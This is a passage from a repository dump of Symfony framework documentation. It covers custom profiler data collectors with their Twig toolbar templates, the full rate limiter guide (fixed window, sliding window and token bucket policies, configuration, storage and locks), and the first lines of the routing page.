refresh after each AJAX request. However, you can set the\n``Symfony-Debug-Toolbar-Replace`` header to a value of ``'1'`` in the response to\nthe AJAX request to force the refresh of the toolbar::\n\n    $response->headers->set('Symfony-Debug-Toolbar-Replace', '1');\n\nIdeally this header should only be set during development and not for\nproduction. To do that, create an :doc:`event subscriber </event_dispatcher>`\nand listen to the :ref:`kernel.response <component-http-kernel-kernel-response>`\nevent::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpKernel\\Event\\ResponseEvent;\n    use Symfony\\Component\\HttpKernel\\KernelInterface;\n\n    // ...\n\n    class MySubscriber implements EventSubscriberInterface\n    {\n        public function __construct(\n            private KernelInterface $kernel,\n        ) {\n        }\n\n        // ...\n\n        public function onKernelResponse(ResponseEvent $event): void\n        {\n            if (!$this->kernel->isDebug()) {\n                return;\n            }\n\n            $request = $event->getRequest();\n            if (!$request->isXmlHttpRequest()) {\n                return;\n            }\n\n            $response = $event->getResponse();\n            $response->headers->set('Symfony-Debug-Toolbar-Replace', '1');\n        }\n    }\n\n.. _profiler-data-collector:\n\nCreating a Data Collector\n-------------------------\n\nThe Symfony Profiler obtains its profiling and debug information using some\nspecial classes called data collectors. Symfony comes bundled with a few of\nthem, but you can also create your own.\n\nA data collector is a PHP class that implements the\n:class:`Symfony\\\\Component\\\\HttpKernel\\\\DataCollector\\\\DataCollectorInterface`.\nFor convenience, your data collectors can also extend from the\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\DataCollector\\\\AbstractDataCollector`\nclass, which implements the interface and provides some utilities and the\n``$this->data`` property to store the collected information.\n\nThe following example shows a custom collector that stores information about the\nrequest::\n\n    // src/DataCollector/RequestCollector.php\n    namespace App\\DataCollector;\n\n    use Symfony\\Bundle\\FrameworkBundle\\DataCollector\\AbstractDataCollector;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class RequestCollector extends AbstractDataCollector\n    {\n        public function collect(Request $request, Response $response, ?\\Throwable $exception = null): void\n        {\n            $this->data = [\n                'method' => $request->getMethod(),\n                'acceptable_content_types' => $request->getAcceptableContentTypes(),\n            ];\n        }\n    }\n\nThese are the method that you can define in the data collector class:\n\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\DataCollector\\\\DataCollectorInterface::collect` method:\n    Stores the collected data in local properties (``$this->data`` if you extend\n    from ``AbstractDataCollector``). If you need some services to collect the\n    data, inject those services in the data collector constructor.\n\n    .. warning::\n\n        The ``collect()`` method is only called once. It is not used to \"gather\"\n        data but is there to \"pick up\" the data that has been stored by your\n        service.\n\n    .. warning::\n\n        As the profiler serializes data collector instances, you should not\n        store objects that cannot be serialized (like PDO objects) or you need\n        to provide your own ``serialize()`` method.\n\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\DataCollector\\\\DataCollectorInterface::reset` method:\n    It's called between requests to reset the state of the profiler. By default\n    it only empties the ``$this->data`` contents, but you can override this method\n    to do additional cleaning.\n\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\DataCollector\\\\DataCollectorInterface::getName` method:\n    Returns the collector identifier, which must be unique in the application.\n    By default it returns the FQCN of the data collector class, but you can\n    override this method to return a custom name (e.g. ``app.request_collector``).\n    This value is used later to access the collector information (see\n    :doc:`/testing/profiling`) so you may prefer using short strings instead of FQCN strings.\n\nThe ``collect()`` method is called during the :ref:`kernel.response <component-http-kernel-kernel-response>`\nevent. If you need to collect data that is only available later, implement\n:class:`Symfony\\\\Component\\\\HttpKernel\\\\DataCollector\\\\LateDataCollectorInterface`\nand define the ``lateCollect()`` method, which is invoked right before the profiler\ndata serialization (during :ref:`kernel.terminate <component-http-kernel-kernel-terminate>` event).\n\n.. note::\n\n    If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`\n    with ``autoconfigure``, then Symfony will start using your data collector after the\n    next page refresh. Otherwise, :ref:`enable the data collector by hand <data_collector_tag>`.\n\nAdding Web Profiler Templates\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe information collected by your data collector can be displayed both in the\nweb debug toolbar and in the web profiler. To do so, you need to create a Twig\ntemplate that includes some specific blocks.\n\nFirst, add the ``getTemplate()`` method in your data collector class to return\nthe path of the Twig template to use. Then, add some *getters* to give the\ntemplate access to the collected information::\n\n    // src/DataCollector/RequestCollector.php\n    namespace App\\DataCollector;\n\n    use Symfony\\Bundle\\FrameworkBundle\\DataCollector\\AbstractDataCollector;\n    use Symfony\\Component\\VarDumper\\Cloner\\Data;\n\n    class RequestCollector extends AbstractDataCollector\n    {\n        // ...\n\n        public static function getTemplate(): ?string\n        {\n            return 'data_collector/template.html.twig';\n        }\n\n        public function getMethod(): string\n        {\n            return $this->data['method'];\n        }\n\n        public function getAcceptableContentTypes(): array\n        {\n            return $this->data['acceptable_content_types'];\n        }\n\n        public function getSomeObject(): Data\n        {\n            // use the cloneVar() method to dump collected data in the profiler\n            return $this->cloneVar($this->data['method']);\n        }\n    }\n\nIn the simplest case, you want to display the information in the toolbar\nwithout providing a profiler panel. This requires to define the ``toolbar``\nblock and set the value of two variables called ``icon`` and ``text``:\n\n.. code-block:: html+twig\n\n    {# templates/data_collector/template.html.twig #}\n    {% extends '@WebProfiler/Profiler/layout.html.twig' %}\n\n    {% block toolbar %}\n        {% set icon %}\n            {# this is the content displayed as a panel in the toolbar #}\n            <svg xmlns=\"http://www.w3.org/2000/svg\"> ... </svg>\n            <span class=\"sf-toolbar-value\">Request</span>\n        {% endset %}\n\n        {% set text %}\n            {# this is the content displayed when hovering the mouse over\n               the toolbar panel #}\n            <div class=\"sf-toolbar-info-piece\">\n                <b>Method</b>\n                <span>{{ collector.method }}</span>\n            </div>\n\n            <div class=\"sf-toolbar-info-piece\">\n                <b>Accepted content type</b>\n                <span>{{ collector.acceptableContentTypes|join(', ') }}</span>\n            </div>\n        {% endset %}\n\n        {# the 'link' value set to 'false' means that this panel doesn't\n           show a section in the web profiler #}\n        {{ include('@WebProfiler/Profiler/toolbar_item.html.twig', { link: false }) }}\n    {% endblock %}\n\n.. tip::\n\n    Symfony Profiler icons are selected from `Tabler icons`_, a large and open\n    source collection of SVG icons. It's recommended to also use those icons for\n    your own profiler panels to get a consistent look.\n\n.. tip::\n\n    Built-in collector templates define all their images as embedded SVG files.\n    This makes them work everywhere without having to mess with web assets links:\n\n    .. code-block:: twig\n\n        {% set icon %}\n            {{ include('data_collector/icon.svg') }}\n            {# ... #}\n        {% endset %}\n\nIf the toolbar panel includes extended web profiler information, the Twig template\nmust also define additional blocks:\n\n.. code-block:: html+twig\n\n    {# templates/data_collector/template.html.twig #}\n    {% extends '@WebProfiler/Profiler/layout.html.twig' %}\n\n    {% block toolbar %}\n        {% set icon %}\n            {# ... #}\n        {% endset %}\n\n        {% set text %}\n            <div class=\"sf-toolbar-info-piece\">\n                {# ... #}\n            </div>\n        {% endset %}\n\n        {{ include('@WebProfiler/Profiler/toolbar_item.html.twig', { 'link': true }) }}\n    {% endblock %}\n\n    {% block head %}\n        {# Optional. Here you can link to or define your own CSS and JS contents. #}\n        {# Use {{ parent() }} to extend the default styles instead of overriding them. #}\n    {% endblock %}\n\n    {% block menu %}\n        {# This left-hand menu appears when using the full-screen profiler. #}\n        <span class=\"label\">\n            <span class=\"icon\"><img src=\"...\" alt=\"\"/></span>\n            <strong>Request</strong>\n        </span>\n    {% endblock %}\n\n    {% block panel %}\n        {# Optional, for showing the most details. #}\n        <h2>Acceptable Content Types</h2>\n        <table>\n            <tr>\n                <th>Content Type</th>\n            </tr>\n\n            {% for type in collector.acceptableContentTypes %}\n            <tr>\n                <td>{{ type }}</td>\n            </tr>\n            {% endfor %}\n\n            {# use the profiler_dump() function to render the contents of dumped objects #}\n            <tr>\n                {{ profiler_dump(collector.someObject) }}\n            </tr>\n        </table>\n    {% endblock %}\n\nThe ``menu`` and ``panel`` blocks are the only required blocks to define the\ncontents displayed in the web profiler panel associated with this data collector.\nAll blocks have access to the ``collector`` object.\n\n.. note::\n\n    The position of each panel in the toolbar is determined by the collector\n    priority, which can only be defined when :ref:`configuring the data collector by hand <data_collector_tag>`.\n\n.. note::\n\n    If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`\n    with ``autoconfigure``, then Symfony will start displaying your collector data\n    in the toolbar after the next page refresh. Otherwise, :ref:`enable the data collector by hand <data_collector_tag>`.\n\n.. _data_collector_tag:\n\nEnabling Custom Data Collectors\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you don't use Symfony's default configuration with\n:ref:`autowire and autoconfigure <service-container-services-load-example>`\nyou'll need to configure the data collector explicitly:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            App\\DataCollector\\RequestCollector:\n                tags:\n                    -\n                        name: data_collector\n                        # must match the value returned by the getName() method\n                        id: 'App\\DataCollector\\RequestCollector'\n                        # optional template (it has more priority than the value returned by getTemplate())\n                        template: 'data_collector/template.html.twig'\n                        # optional priority (positive or negative integer; default = 0)\n                        # priority: 300\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\DataCollector\\RequestCollector\">\n                    <!-- the 'template' attribute has more priority than the value returned by getTemplate() -->\n                    <tag name=\"data_collector\"\n                        id=\"App\\DataCollector\\RequestCollector\"\n                        template=\"data_collector/template.html.twig\"\n                    />\n                    <!-- optional 'priority' attribute (positive or negative integer; default = 0) -->\n                    <!-- priority=\"300\" -->\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\DataCollector\\RequestCollector;\n\n        return function(ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(RequestCollector::class)\n                ->tag('data_collector', [\n                    'id' => RequestCollector::class,\n                    // optional template (it has more priority than the value returned by getTemplate())\n                    'template' => 'data_collector/template.html.twig',\n                    // optional priority (positive or negative integer; default = 0)\n                    // 'priority' => 300,\n                ]);\n        };\n\n.. _`Single-page applications`: https://en.wikipedia.org/wiki/Single-page_application\n.. _`Blackfire`: https://blackfire.io/docs/introduction?utm_source=symfony&utm_medium=symfonycom_docs&utm_campaign=profiler\n.. _`Tabler icons`: https://github.com/tabler/tabler-icons\n"
        },
        {
          "name": "quick_tour",
          "type": "tree",
          "content": null
        },
        {
          "name": "rate_limiter.rst",
          "type": "blob",
          "size": 20.703125,
          "content": "Rate Limiter\n============\n\nA \"rate limiter\" controls how frequently some event (e.g. an HTTP request or a\nlogin attempt) is allowed to happen. Rate limiting is commonly used as a\ndefensive measure to protect services from excessive use (intended or not) and\nmaintain their availability. It's also useful to control your internal or\noutbound processes (e.g. limit the number of simultaneously processed messages).\n\nSymfony uses these rate limiters in built-in features like :ref:`login throttling <security-login-throttling>`,\nwhich limits how many failed login attempts a user can make in a given period of\ntime, but you can use them for your own features too.\n\n.. danger::\n\n    By definition, the Symfony rate limiters require Symfony to be booted\n    in a PHP process. This makes them not useful to protect against `DoS attacks`_.\n    Such protections must consume the least resources possible. Consider\n    using `Apache mod_ratelimit`_, `NGINX rate limiting`_ or proxies (like\n    AWS or Cloudflare) to prevent your server from being overwhelmed.\n\n.. _rate-limiter-policies:\n\nRate Limiting Policies\n----------------------\n\nSymfony's rate limiter implements some of the most common policies to enforce\nrate limits: **fixed window**, **sliding window**, **token bucket**.\n\nFixed Window Rate Limiter\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThis is the simplest technique and it's based on setting a limit for a given\ninterval of time (e.g. 5,000 requests per hour or 3 login attempts every 15\nminutes).\n\nIn the diagram below, the limit is set to \"5 tokens per hour\". Each window\nstarts at the first hit (i.e. 10:15, 11:30 and 12:30). As soon as there are\n5 hits (the blue squares) in a window, all others will be rejected (red\nsquares).\n\n.. raw:: html\n\n    <object data=\"_images/rate_limiter/fixed_window.svg\" type=\"image/svg+xml\"\n        alt=\"A timeline showing fixed windows that accept a maximum of 5 hits.\"\n    ></object>\n\nIts main drawback is that resource usage is not evenly distributed in time and\nit can overload the server at the window edges. In this example,\nthere were 6 accepted requests between 11:00 and 12:00.\n\nThis is more significant with bigger limits. For instance, with 5,000 requests\nper hour, a user could make 4,999 requests in the last minute of some\nhour and another 5,000 requests during the first minute of the next hour,\nmaking 9,999 requests in total in two minutes and possibly overloading the\nserver. These periods of excessive usage are called \"bursts\".\n\nSliding Window Rate Limiter\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe sliding window algorithm is an alternative to the fixed window algorithm\ndesigned to reduce bursts. This is the same example as above, but then\nusing a 1 hour window that slides over the timeline:\n\n.. raw:: html\n\n    <object data=\"_images/rate_limiter/sliding_window.svg\" type=\"image/svg+xml\"\n        alt=\"The same timeline with a sliding window that accepts only 5 hits in the previous hour.\"\n    ></object>\n\nAs you can see, this removes the edges of the window and would prevent the\n6th request at 11:45.\n\nTo achieve this, the rate limit is approximated based on the current window and\nthe previous window.\n\nFor example: the limit is 5,000 requests per hour; a user made 4,000 requests\nthe previous hour and 500 requests this hour. 15 minutes in to the current hour\n(25% of the window) the hit count would be calculated as: 75% * 4,000 + 500 = 3,500.\nAt this point in time the user can only do 1,500 more requests.\n\nThe math shows that the closer the last window is, the more the hit count\nof the last window will affect the current limit. This will make sure that a user can\ndo 5,000 requests per hour but only if they are evenly spread out.\n\nToken Bucket Rate Limiter\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThis technique implements the `token bucket algorithm`_, which defines\ncontinuously updating the budget of resource usage. It roughly works like this:\n\n#. A bucket is created with an initial set of tokens;\n#. A new token is added to the bucket with a predefined frequency (e.g. every second);\n#. Allowing an event consumes one or more tokens;\n#. If the bucket still contains tokens, the event is allowed; otherwise, it's denied;\n#. If the bucket is at full capacity, new tokens are discarded.\n\nThe below diagram shows a token bucket of size 4 that is filled with a rate\nof 1 token per 15 minutes:\n\n.. raw:: html\n\n    <object data=\"_images/rate_limiter/token_bucket.svg\" type=\"image/svg+xml\"\n        alt=\"A timeline showing the token bucket over time, as described in this section.\"\n    ></object>\n\nThis algorithm handles more complex back-off burst management.\nFor instance, it can allow a user to try a password 5 times and then only\nallow 1 every 15 minutes (unless the user waits 75 minutes and they will be\nallowed 5 tries again).\n\nInstallation\n------------\n\nBefore using a rate limiter for the first time, run the following command to\ninstall the associated Symfony Component in your application:\n\n.. code-block:: terminal\n\n    $ composer require symfony/rate-limiter\n\nConfiguration\n-------------\n\nThe following example creates two different rate limiters for an API service, to\nenforce different levels of service (free or paid):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/rate_limiter.yaml\n        framework:\n            rate_limiter:\n                anonymous_api:\n                    # use 'sliding_window' if you prefer that policy\n                    policy: 'fixed_window'\n                    limit: 100\n                    interval: '60 minutes'\n                authenticated_api:\n                    policy: 'token_bucket'\n                    limit: 5000\n                    rate: { interval: '15 minutes', amount: 500 }\n\n    .. code-block:: xml\n\n        <!-- config/packages/rate_limiter.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:rate-limiter>\n                    <!-- policy: use 'sliding_window' if you prefer that policy -->\n                    <framework:limiter name=\"anonymous_api\"\n                        policy=\"fixed_window\"\n                        limit=\"100\"\n                        interval=\"60 minutes\"\n                    />\n\n                    <framework:limiter name=\"authenticated_api\"\n                        policy=\"token_bucket\"\n                        limit=\"5000\"\n                    >\n                        <framework:rate interval=\"15 minutes\"\n                            amount=\"500\"\n                        />\n                    </framework:limiter>\n                </framework:rate-limiter>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/rate_limiter.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->rateLimiter()\n                ->limiter('anonymous_api')\n                    // use 'sliding_window' if you prefer that policy\n                    ->policy('fixed_window')\n                    ->limit(100)\n                    ->interval('60 minutes')\n                ;\n\n            $framework->rateLimiter()\n                ->limiter('authenticated_api')\n                    ->policy('token_bucket')\n                    ->limit(5000)\n                    ->rate()\n                        ->interval('15 minutes')\n                        ->amount(500)\n                ;\n        };\n\n.. note::\n\n    The value of the ``interval`` option must be a number followed by any of the\n    units accepted by the `PHP date relative formats`_ (e.g. ``3 seconds``,\n    ``10 hours``, ``1 day``, etc.)\n\nIn the ``anonymous_api`` limiter, after making the first HTTP request, you can\nmake up to 100 requests in the next 60 minutes. After that time, the counter\nresets and you have another 100 requests for the following 60 minutes.\n\nIn the ``authenticated_api`` limiter, after making the first HTTP request you\nare allowed to make up to 5,000 HTTP requests in total, and this number grows\nat a rate of another 500 requests every 15 minutes. If you don't make that\nnumber of requests, the unused ones don't accumulate (the ``limit`` option\nprevents that number from being higher than 5,000).\n\n.. tip::\n\n    All rate-limiters are tagged with the ``rate_limiter`` tag, so you can\n    find them with a :doc:`tagged iterator </service_container/tags>` or\n    :doc:`locator </service_container/service_subscribers_locators>`.\n\n    .. versionadded:: 7.1\n\n        The automatic addition of the ``rate_limiter`` tag was introduced\n        in Symfony 7.1.\n\nRate Limiting in Action\n-----------------------\n\nAfter having installed and configured the rate limiter, inject it in any service\nor controller and call the ``consume()`` method to try to consume a given number\nof tokens. For example, this controller uses the previous rate limiter to control\nthe number of requests to the API::\n\n    // src/Controller/ApiController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Exception\\TooManyRequestsHttpException;\n    use Symfony\\Component\\RateLimiter\\RateLimiterFactory;\n\n    class ApiController extends AbstractController\n    {\n        // if you're using service autowiring, the variable name must be:\n        // \"rate limiter name\" (in camelCase) + \"Limiter\" suffix\n        public function index(Request $request, RateLimiterFactory $anonymousApiLimiter): Response\n        {\n            // create a limiter based on a unique identifier of the client\n            // (e.g. the client's IP address, a username/email, an API key, etc.)\n            $limiter = $anonymousApiLimiter->create($request->getClientIp());\n\n            // the argument of consume() is the number of tokens to consume\n            // and returns an object of type Limit\n            if (false === $limiter->consume(1)->isAccepted()) {\n                throw new TooManyRequestsHttpException();\n            }\n\n            // you can also use the ensureAccepted() method - which throws a\n            // RateLimitExceededException if the limit has been reached\n            // $limiter->consume(1)->ensureAccepted();\n\n            // to reset the counter\n            // $limiter->reset();\n\n            // ...\n        }\n    }\n\n.. note::\n\n    In a real application, instead of checking the rate limiter in all the API\n    controller methods, create an :doc:`event listener or subscriber </event_dispatcher>`\n    for the :ref:`kernel.request event <component-http-kernel-kernel-request>`\n    and check the rate limiter once for all requests.\n\nWait until a Token is Available\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of dropping a request or process when the limit has been reached,\nyou might want to wait until a new token is available. This can be achieved\nusing the ``reserve()`` method::\n\n    // src/Controller/ApiController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\RateLimiter\\RateLimiterFactory;\n\n    class ApiController extends AbstractController\n    {\n        public function registerUser(Request $request, RateLimiterFactory $authenticatedApiLimiter): Response\n        {\n            $apiKey = $request->headers->get('apikey');\n            $limiter = $authenticatedApiLimiter->create($apiKey);\n\n            // this blocks the application until the given number of tokens can be consumed\n            $limiter->reserve(1)->wait();\n\n            // optional, pass a maximum wait time (in seconds), a MaxWaitDurationExceededException\n            // is thrown if the process has to wait longer. E.g. to wait at most 20 seconds:\n            //$limiter->reserve(1, 20)->wait();\n\n            // ...\n        }\n\n        // ...\n    }\n\nThe ``reserve()`` method is able to reserve a token in the future. Only use\nthis method if you're planning to wait, otherwise you will block other\nprocesses by reserving unused tokens.\n\n.. note::\n\n    Not all strategies allow reserving tokens in the future. These\n    strategies may throw a ``ReserveNotSupportedException`` when calling\n    ``reserve()``.\n\n    In these cases, you can use ``consume()`` together with ``wait()``, but\n    there is no guarantee that a token is available after the wait::\n\n        // ...\n        do {\n            $limit = $limiter->consume(1);\n            $limit->wait();\n        } while (!$limit->isAccepted());\n\nExposing the Rate Limiter Status\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen using a rate limiter in APIs, it's common to include some standard HTTP\nheaders in the response to expose the limit status (e.g. remaining tokens, when\nnew tokens will be available, etc.)\n\nUse the :class:`Symfony\\\\Component\\\\RateLimiter\\\\RateLimit` object returned by\nthe ``consume()`` method (also available via the ``getRateLimit()`` method of\nthe :class:`Symfony\\\\Component\\\\RateLimiter\\\\Reservation` object returned by the\n``reserve()`` method) to get the value of those HTTP headers::\n\n    // src/Controller/ApiController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\RateLimiter\\RateLimiterFactory;\n\n    class ApiController extends AbstractController\n    {\n        public function index(Request $request, RateLimiterFactory $anonymousApiLimiter): Response\n        {\n            $limiter = $anonymousApiLimiter->create($request->getClientIp());\n            $limit = $limiter->consume();\n            $headers = [\n                'X-RateLimit-Remaining' => $limit->getRemainingTokens(),\n                'X-RateLimit-Retry-After' => $limit->getRetryAfter()->getTimestamp() - time(),\n                'X-RateLimit-Limit' => $limit->getLimit(),\n            ];\n\n            if (false === $limit->isAccepted()) {\n                return new Response(null, Response::HTTP_TOO_MANY_REQUESTS, $headers);\n            }\n\n            // ...\n\n            $response = new Response('...');\n            $response->headers->add($headers);\n\n            return $response;\n        }\n    }\n\n.. _rate-limiter-storage:\n\nStoring Rate Limiter State\n--------------------------\n\nAll rate limiter policies require to store their state (e.g. how many hits were\nalready made in the current time window). By default, all limiters use the\n``cache.rate_limiter`` cache pool created with the :doc:`Cache component </cache>`.\nThis means that every time you clear the cache, the rate limiter will be reset.\n\nYou can use the ``cache_pool`` option to override the cache used by a specific limiter\n(or even :ref:`create a new cache pool <cache-create-pools>` for it):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/rate_limiter.yaml\n        framework:\n            rate_limiter:\n                anonymous_api:\n                    # ...\n\n                    # use the \"cache.anonymous_rate_limiter\" cache pool\n                    cache_pool: 'cache.anonymous_rate_limiter'\n\n    .. code-block:: xml\n\n        <!-- config/packages/rate_limiter.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:rate-limiter>\n                    <!-- cache-pool: use the \"cache.anonymous_rate_limiter\" cache pool -->\n                    <framework:limiter name=\"anonymous_api\"\n                        policy=\"fixed_window\"\n                        limit=\"100\"\n                        interval=\"60 minutes\"\n                        cache-pool=\"cache.anonymous_rate_limiter\"\n                    />\n\n                    <!-- ... -->\n                </framework:rate-limiter>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/rate_limiter.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->rateLimiter()\n                ->limiter('anonymous_api')\n                    // ...\n\n                    // use the \"cache.anonymous_rate_limiter\" cache pool\n                    ->cachePool('cache.anonymous_rate_limiter')\n                ;\n        };\n\n.. note::\n\n    Instead of using the Cache component, you can also implement a custom\n    storage. Create a PHP class that implements the\n    :class:`Symfony\\\\Component\\\\RateLimiter\\\\Storage\\\\StorageInterface` and\n    use the ``storage_service`` setting of each limiter to the service ID\n    of this class.\n\nUsing Locks to Prevent Race Conditions\n--------------------------------------\n\n`Race conditions`_ can happen when the same rate limiter is used by multiple\nsimultaneous requests (e.g. three servers of a company hitting your API at the\nsame time). Rate limiters use :doc:`locks </lock>` to protect their operations\nagainst these race conditions.\n\nBy default, Symfony uses the global lock configured by ``framework.lock``, but\nyou can use a specific :ref:`named lock <lock-named-locks>` via the\n``lock_factory`` option (or none at all):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/rate_limiter.yaml\n        framework:\n            rate_limiter:\n                anonymous_api:\n                    # ...\n\n                    # use the \"lock.rate_limiter.factory\" for this limiter\n                    lock_factory: 'lock.rate_limiter.factory'\n\n                    # or don't use any lock mechanism\n                    lock_factory: null\n\n    .. code-block:: xml\n\n        <!-- config/packages/rate_limiter.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:rate-limiter>\n                    <!-- limiter-factory: use the \"lock.rate_limiter.factory\" for this limiter -->\n                    <framework:limiter name=\"anonymous_api\"\n                        policy=\"fixed_window\"\n                        limit=\"100\"\n                        interval=\"60 minutes\"\n                        lock-factory=\"lock.rate_limiter.factory\"\n                    />\n\n                    <!-- limiter-factory: or don't use any lock mechanism -->\n                    <framework:limiter name=\"anonymous_api\"\n                        policy=\"fixed_window\"\n                        limit=\"100\"\n                        interval=\"60 minutes\"\n                        lock-factory=\"null\"\n                    />\n\n                    <!-- ... -->\n                </framework:rate-limiter>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/rate_limiter.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->rateLimiter()\n                ->limiter('anonymous_api')\n                    // ...\n\n                    // use the \"lock.rate_limiter.factory\" for this limiter\n                    ->lockFactory('lock.rate_limiter.factory')\n\n                    // or don't use any lock mechanism\n                    ->lockFactory(null)\n                ;\n        };\n\n.. _`DoS attacks`: https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\n.. _`Apache mod_ratelimit`: https://httpd.apache.org/docs/current/mod/mod_ratelimit.html\n.. _`NGINX rate limiting`: https://www.nginx.com/blog/rate-limiting-nginx/\n.. _`token bucket algorithm`: https://en.wikipedia.org/wiki/Token_bucket\n.. _`PHP date relative formats`: https://www.php.net/manual/en/datetime.formats.php#datetime.formats.relative\n.. _`Race conditions`: https://en.wikipedia.org/wiki/Race_condition\n"
        },
        {
          "name": "reference",
          "type": "tree",
          "content": null
        },
        {
          "name": "routing.rst",
          "type": "blob",
          "size": 102.7626953125,
          "content": "Routing\n=======\n\nWhen your application receives a request, it calls a\n:doc:`controller action </controller>` to generate the response. The routing\nconfiguration defines which action to run for each incoming URL. It also\nprovides other useful features, like generating SEO-friendly URLs (e.g.\n``/read/intro-to-symfony`` instead of ``index.php?article_id=57``).\n\n.. _routing-creating-routes:\n\nCreating Routes\n---------------\n\nRoutes can be configured in YAML, XML, PHP or using attributes.\nAll formats provide the same features and performance, so choose\nyour favorite.\n:ref:`Symfony recommends attributes <best-practice-controller-attributes>`\nbecause it's convenient to put the route and controller in the same place.\n\nCreating Routes as Attributes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPHP attributes allow to define routes next to the code of the\n:doc:`controllers </controller>` associated to those routes. Attributes are\nnative in PHP 8 and higher versions, so you can use them right away.\n\nYou need to add a bit of configuration to your project before using them. If your\nproject uses :ref:`Symfony Flex <symfony-flex>`, this file is already created for you.\nOtherwise, create the following file manually:\n\n.. code-block:: yaml\n\n    # config/routes/attributes.yaml\n    controllers:\n        resource:\n            path: ../../src/Controller/\n            namespace: App\\Controller\n        type: attribute\n\n    kernel:\n        resource: App\\Kernel\n        type: attribute\n\nThis configuration tells Symfony to look for routes defined as attributes on\nclasses declared in the ``App\\Controller`` namespace and stored in the\n``src/Controller/`` directory which follows the PSR-4 standard. The kernel can\nact as a controller too, which is especially useful for small applications that\nuse Symfony as a microframework.\n\nSuppose you want to define a route for the ``/blog`` URL in your application. To\ndo so, create a :doc:`controller class </controller>` like the following:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/blog', name: 'blog_list')]\n            public function list(): Response\n            {\n                // ...\n            }\n        }\n\nThis configuration defines a route called 